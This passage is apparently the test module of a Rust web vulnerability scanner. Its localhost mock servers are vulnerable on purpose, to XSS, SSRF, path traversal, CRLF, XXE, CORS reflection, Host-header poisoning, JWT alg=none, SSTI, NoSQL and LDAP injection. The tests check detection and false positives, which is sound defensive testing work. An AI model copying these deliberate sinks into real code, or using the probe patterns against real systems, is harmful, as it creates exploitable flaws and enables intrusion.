    async fn start_echo(reflect: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await { Ok(x) => x, Err(_) => break };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line = req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target = first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let body = if reflect {
                        format!("<html><body>{target}</body></html>")
                    } else {
                        "<html></html>".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    s.write_all(resp.as_bytes()).await.unwrap();
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_reflected_xss() {
        let addr = start_echo(true).await;
        let req = Request::new("GET", &format!("http://127.0.0.1:{}/x?q=hello", addr.port())).unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig::default(),
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(findings.iter().any(|f| f.detector == "reflected-xss"));
    }

    #[tokio::test]
    async fn oob_ssrf_fires_when_target_fetches_payload() {
        // Bind the OOB listener on a random port, then relaunch it with
        // the public_host that advertises the real address.
        let probe = burpfree_oob::OobServer::start(burpfree_oob::OobConfig {
            http_bind: "127.0.0.1:0".parse().unwrap(),
            dns_bind: None,
            public_host: "127.0.0.1".into(),
            capacity: 64,
        })
        .await
        .unwrap();
        let oob_port = probe.http_addr().unwrap().port();
        probe.shutdown().await;
        tokio::time::sleep(Duration::from_millis(50)).await;
        let oob_pub = format!("127.0.0.1:{oob_port}");
        let oob = burpfree_oob::OobServer::start(burpfree_oob::OobConfig {
            http_bind: format!("127.0.0.1:{oob_port}").parse().unwrap(),
            dns_bind: None,
            public_host: oob_pub.clone(),
            capacity: 64,
        })
        .await
        .expect("re-bind oob with known port");

        // Target server that fetches whatever URL is in `u` (SSRF).
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 2048];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let path = req.lines().next().unwrap_or("").split_whitespace().nth(1).unwrap_or("/").to_string();
                    // Extract u= value.
                    let fetch_url = path
                        .split('?')
                        .nth(1)
                        .unwrap_or("")
                        .split('&')
                        .find_map(|kv| kv.strip_prefix("u="))
                        .unwrap_or("")
                        .to_string();
                    let decoded = percent_encoding::percent_decode_str(&fetch_url).decode_utf8_lossy().to_string();
                    // Try to fetch it (SSRF simulation).
                    if decoded.starts_with("http://") {
                        if let Ok(url) = url::Url::parse(&decoded) {
                            if let Some(h) = url.host_str() {
                                let port = url.port_or_known_default().unwrap_or(80);
                                if let Ok(mut c) = tokio::net::TcpStream::connect((h, port)).await {
                                    let path = if url.path().is_empty() { "/".to_string() } else { url.path().to_string() };
                                    let out = format!(
                                        "GET {path} HTTP/1.1\r\nHost: {h}:{port}\r\nConnection: close\r\n\r\n"
                                    );
                                    let _ = c.write_all(out.as_bytes()).await;
                                    let _ = c.flush().await;
                                    let mut _junk = Vec::new();
                                    let _ = c.read_to_end(&mut _junk).await;
                                }
                            }
                        }
                    }
                    let body = "ok";
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });

        // Now scan with just the OOB SSRF probe enabled.
        let req = Request::new("GET", &format!("http://127.0.0.1:{}/fetch?u=original", addr.port())).unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::OobSsrf],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        )
        .with_oob(oob);
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "oob-ssrf"),
            "expected an OOB SSRF finding, got {} finding(s)",
            findings.len()
        );
    }

    #[tokio::test]
    async fn no_findings_when_not_reflected() {
        let addr = start_echo(false).await;
        let req = Request::new("GET", &format!("http://127.0.0.1:{}/x?q=hi", addr.port())).unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig::default(),
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(findings.iter().all(|f| f.detector != "reflected-xss"));
    }

    /// Mock server tuned for the path-traversal probe: returns the
    /// `/etc/passwd` first line verbatim whenever the request URL
    /// mentions `/etc/passwd` (in any encoding), otherwise returns a
    /// bland 200.
    async fn start_lfi_mock() -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line = req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target = first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    // Lower-case + percent-decoded view so we match
                    // the encoded variants too.
                    let decoded = percent_encoding::percent_decode_str(&target)
                        .decode_utf8_lossy()
                        .to_string()
                        .to_ascii_lowercase();
                    let body = if decoded.contains("/etc/passwd") {
                        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n".to_string()
                    } else {
                        "<html></html>".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_path_traversal() {
        let addr = start_lfi_mock().await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/read?file=welcome", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::PathTraversal],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "path-traversal"),
            "expected a path-traversal finding, got {} finding(s)",
            findings.len()
        );
        let f = findings
            .iter()
            .find(|f| f.detector == "path-traversal")
            .unwrap();
        assert!(f.references.iter().any(|r| r == "CWE-22"));
    }

    /// Mock server for CRLF injection: the mock parses the raw request
    /// line and *echoes any header-looking content from the query*
    /// back into the response headers. This simulates the real-world
    /// case where the application copies a parameter into a response
    /// header (e.g. Location, Set-Cookie, or a custom header).
    async fn start_crlf_mock() -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 8192];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    // The vulnerable app behaviour: percent-decode the
                    // `q=` value and emit it verbatim as part of a
                    // response header value — a classic header-injection
                    // sink.
                    let q = target
                        .split('?')
                        .nth(1)
                        .unwrap_or("")
                        .split('&')
                        .find_map(|kv| kv.strip_prefix("q="))
                        .unwrap_or("")
                        .to_string();
                    let decoded = percent_encoding::percent_decode_str(&q)
                        .decode_utf8_lossy()
                        .to_string();
                    // Vulnerable sink: splice the decoded parameter
                    // into the header block without stripping CR/LF.
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nX-Echo: {decoded}\r\nContent-Length: 2\r\n\r\nok"
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_crlf_injection() {
        let addr = start_crlf_mock().await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/echo?q=hello", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::CrlfInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "crlf-injection"),
            "expected a crlf-injection finding, got {} finding(s)",
            findings.len()
        );
    }

    /// Mock server for XXE: pretends to be an XML endpoint that
    /// parses the request body and reflects `<foo>` content back.
    /// When the body contains `&xxe;` the mock inlines `root:x:0:0`
    /// to simulate the parser having resolved the external entity.
    async fn start_xxe_mock() -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 8192];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    // Rough split of header block from body — good
                    // enough for a test.
                    let body = req.split("\r\n\r\n").nth(1).unwrap_or("");
                    let out_body = if body.contains("&xxe;") {
                        "<result>root:x:0:0:root:/root:/bin/bash</result>".to_string()
                    } else {
                        "<result>unknown</result>".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-Length: {}\r\n\r\n{out_body}",
                        out_body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_xxe() {
        let addr = start_xxe_mock().await;
        let mut req = Request::new(
            "POST",
            &format!("http://127.0.0.1:{}/soap", addr.port()),
        )
        .unwrap();
        req.headers.set("Content-Type", "application/xml");
        req.body = b"<ping/>".to_vec();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::XxeInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "xxe"),
            "expected an xxe finding, got {} finding(s)",
            findings.len()
        );
    }

    #[tokio::test]
    async fn xxe_skips_non_xml_requests() {
        // A JSON POST should never trigger the XXE probe.
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        drop(listener);
        let mut req =
            Request::new("POST", &format!("http://127.0.0.1:{}/api", addr.port())).unwrap();
        req.headers.set("Content-Type", "application/json");
        req.body = b"{\"x\":1}".to_vec();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::XxeInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(findings.is_empty(), "XXE must skip JSON requests");
    }

    /// Mock server for CORS tests: when `reflect = true` it echoes
    /// whatever `Origin` the client sent + sets ACAC: true. When
    /// `reflect = false` it hardcodes `Access-Control-Allow-Origin:
    /// https://trusted.example` and never adds credentials.
    async fn start_cors_mock(reflect: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    // Extract the Origin header verbatim.
                    let origin = req
                        .lines()
                        .find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            if k.trim().eq_ignore_ascii_case("origin") {
                                Some(v.trim().to_string())
                            } else {
                                None
                            }
                        })
                        .unwrap_or_default();
                    let (acao, acac) = if reflect {
                        (origin.clone(), "true")
                    } else {
                        ("https://trusted.example".to_string(), "false")
                    };
                    let body = "ok";
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nAccess-Control-Allow-Origin: {acao}\r\nAccess-Control-Allow-Credentials: {acac}\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_cors_arbitrary_origin_with_credentials() {
        let addr = start_cors_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/api/me", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::CorsMisconfiguration],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "cors-misconfig")
            .expect("expected a cors-misconfig finding");
        // Critical because the mock reflects Origin + sets ACAC: true.
        assert_eq!(hit.severity.as_label(), "critical");
    }

    #[tokio::test]
    async fn cors_no_false_positive_on_hardcoded_allow_origin() {
        let addr = start_cors_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/api/me", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::CorsMisconfiguration],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "cors-misconfig"),
            "static ACAO must not false-positive"
        );
    }

    /// Mock server for Host-header-injection tests. When `reflect =
    /// true`, builds a `Location` header out of the X-Forwarded-Host
    /// header (classic password-reset-link poisoning sink).
    async fn start_host_mock(reflect: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let xfh = req
                        .lines()
                        .find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            if k.trim().eq_ignore_ascii_case("x-forwarded-host") {
                                Some(v.trim().to_string())
                            } else {
                                None
                            }
                        })
                        .unwrap_or_default();
                    let (status, extra) = if reflect && !xfh.is_empty() {
                        (302, format!("Location: https://{xfh}/reset?token=abc\r\n"))
                    } else {
                        (
                            200,
                            "Location: https://canonical.example/\r\n".to_string(),
                        )
                    };
                    let body = "ok";
                    let resp = format!(
                        "HTTP/1.1 {status} Found\r\nContent-Type: text/plain\r\n{extra}Content-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_host_header_injection() {
        let addr = start_host_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/reset", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::HostHeaderInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "host-header-injection"),
            "expected a host-header-injection finding"
        );
    }

    #[tokio::test]
    async fn host_header_injection_no_false_positive() {
        let addr = start_host_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/reset", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::HostHeaderInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "host-header-injection"),
            "static Location must not false-positive"
        );
    }

    /// JWT mock: when `vulnerable = true`, accepts any token whose
    /// header decodes to JSON (including alg:none) and returns 200.
    /// When `vulnerable = false`, only accepts tokens whose header is
    /// `{"alg":"HS256",…}` and 401s otherwise.
    async fn start_jwt_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let auth = req
                        .lines()
                        .find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            if k.trim().eq_ignore_ascii_case("authorization") {
                                Some(v.trim().to_string())
                            } else {
                                None
                            }
                        })
                        .unwrap_or_default();
                    let token = auth.strip_prefix("Bearer ").unwrap_or(&auth);
                    let first_segment = token.split('.').next().unwrap_or("");
                    let header_bytes =
                        burpfree_codec::base64url_decode(first_segment).unwrap_or_default();
                    let header_str =
                        String::from_utf8_lossy(&header_bytes).to_string();
                    let alg = if let Ok(v) =
                        serde_json::from_str::<serde_json::Value>(&header_str)
                    {
                        v.get("alg").and_then(|a| a.as_str()).unwrap_or("").to_string()
                    } else {
                        String::new()
                    };
                    let ok = if vulnerable {
                        // Vulnerable server: alg=none accepted.
                        !alg.is_empty()
                    } else {
                        alg == "HS256"
                    };
                    let (status, body) = if ok {
                        (200, "welcome")
                    } else {
                        (401, "unauth")
                    };
                    let resp = format!(
                        "HTTP/1.1 {status} ..\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    /// Build a HS256-shaped JWT with the given payload. Signature
    /// is a dummy string — the mock servers don't verify, we're
    /// just testing the alg=none bypass path.
    fn make_jwt() -> String {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let payload = r#"{"sub":"alice","role":"user"}"#;
        format!(
            "{}.{}.sig-stub",
            burpfree_codec::base64url_encode(header.as_bytes()),
            burpfree_codec::base64url_encode(payload.as_bytes())
        )
    }

    #[tokio::test]
    async fn detects_jwt_alg_none_bypass() {
        let addr = start_jwt_mock(true).await;
        let token = make_jwt();
        let mut req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/api/me", addr.port()),
        )
        .unwrap();
        req.headers.set("Authorization", format!("Bearer {token}"));
        let mut t = Transaction::new(req);
        // Baseline must be 401 so the probe isn't masked by a
        // publicly-anonymous endpoint.
        let mut r = Response::new(401);
        r.body = b"unauth".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::JwtNoneAlgorithm],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "jwt-none-algorithm"),
            "expected a jwt-none-algorithm finding, got {} finding(s)",
            findings.len()
        );
    }

    #[tokio::test]
    async fn jwt_none_no_false_positive_when_rejected() {
        let addr = start_jwt_mock(false).await;
        let token = make_jwt();
        let mut req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/api/me", addr.port()),
        )
        .unwrap();
        req.headers.set("Authorization", format!("Bearer {token}"));
        let mut t = Transaction::new(req);
        let mut r = Response::new(401);
        r.body = b"unauth".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::JwtNoneAlgorithm],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "jwt-none-algorithm"),
            "well-configured HS256 server must not false-positive"
        );
    }

    /// Mock server for SSTI tests. When `vulnerable = true`, pretends
    /// to be a Jinja2 template that evaluates `{{...}}` expressions
    /// before echoing them back. When `vulnerable = false`, echoes
    /// the raw payload verbatim (so our detector's "marker without
    /// raw payload" guard keeps us honest on false positives).
    async fn start_ssti_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    // Extract the `name=` param (percent-decoded).
                    let raw = target
                        .split('?')
                        .nth(1)
                        .unwrap_or("")
                        .split('&')
                        .find_map(|kv| kv.strip_prefix("name="))
                        .unwrap_or("")
                        .to_string();
                    let decoded = percent_encoding::percent_decode_str(&raw)
                        .decode_utf8_lossy()
                        .to_string();
                    let rendered = if vulnerable {
                        // Minimal Jinja2-ish evaluator covering the
                        // handful of math patterns our probe sends.
                        let mut out = decoded.clone();
                        out = out.replace("{{7*7}}", "49");
                        out = out.replace("{{7*'7'}}", "7777777");
                        out = out.replace("${7*7}", "49");
                        out = out.replace("<%= 7*7 %>", "49");
                        out = out.replace("*{7*7}", "49");
                        out = out.replace("#{7*7}", "49");
                        out
                    } else {
                        decoded.clone()
                    };
                    let body = format!("<html><body>Hello, {rendered}!</body></html>");
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_ssti_jinja2() {
        let addr = start_ssti_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/greet?name=world", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::Ssti],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "ssti")
            .expect("expected an SSTI finding");
        assert_eq!(hit.severity.as_label(), "critical");
        assert!(hit.references.iter().any(|r| r == "CWE-94"));
    }

    #[tokio::test]
    async fn ssti_no_false_positive_on_echo() {
        // Server echoes payloads verbatim. Our detector requires the
        // marker *and* no raw payload remaining — so this must NOT
        // fire.
        let addr = start_ssti_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/greet?name=world", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::Ssti],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "ssti"),
            "echo-only app must not false-positive on SSTI"
        );
    }

    /// Mock server for NoSQL injection tests. Simulates a Mongo-ish
    /// endpoint where `name=X` returns `[]` (empty JSON array,
    /// HTTP 200) but `name[$ne]=0` returns a populated array (which
    /// is longer, triggering the body-length delta).
    async fn start_nosql_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    // "Vulnerable" app: if the query carries `[$ne]`
                    // interpret it as a MongoDB operator and return
                    // a populated list. Otherwise return `[]`.
                    let is_operator = target.contains("[$ne]") || target.contains("%5B%24ne%5D");
                    let body = if vulnerable && is_operator {
                        // 200+ chars so our 50% delta trigger fires
                        // from a 2-char baseline.
                        r#"[{"id":1,"name":"alice","email":"alice@example.com","role":"user"},{"id":2,"name":"bob","email":"bob@example.com","role":"admin"},{"id":3,"name":"carol","email":"carol@example.com","role":"user"}]"#.to_string()
                    } else {
                        "[]".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_nosql_operator_injection() {
        let addr = start_nosql_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/users?name=xxx", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        // Baseline response matches what the mock would return for
        // the vanilla `name=xxx` request: empty array, 2 bytes.
        let mut r = Response::new(200);
        r.body = b"[]".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::NoSqlInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().any(|f| f.detector == "nosql-injection"),
            "expected a nosql-injection finding, got {} finding(s)",
            findings.len()
        );
    }

    #[tokio::test]
    async fn nosql_no_false_positive_when_server_ignores_operator() {
        // Non-vulnerable mock returns `[]` regardless of operator
        // syntax, so there's no differential signal.
        let addr = start_nosql_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/users?name=xxx", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        let mut r = Response::new(200);
        r.body = b"[]".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::NoSqlInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "nosql-injection"),
            "non-vulnerable server must not false-positive"
        );
    }

    /// LDAP mock — returns a Java LDAP error block when the query
    /// value contains an LDAP wildcard (`*`). Otherwise returns a
    /// bland 200.
    async fn start_ldap_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let qs = target
                        .split('?')
                        .nth(1)
                        .unwrap_or("")
                        .to_string();
                    let decoded = percent_encoding::percent_decode_str(&qs)
                        .decode_utf8_lossy()
                        .to_string();
                    // Trigger: the value side of any `uid=...` or
                    // `cn=...` carries a wildcard operator payload.
                    let has_payload = decoded.contains('*') && decoded.contains('(');
                    let body = if vulnerable && has_payload {
                        "LDAPException: Bad search filter at javax.naming.directory.InitialDirContext.search".to_string()
                    } else {
                        "<html>welcome</html>".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_ldap_injection() {
        let addr = start_ldap_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/search?uid=alice", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::LdapInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "ldap-injection")
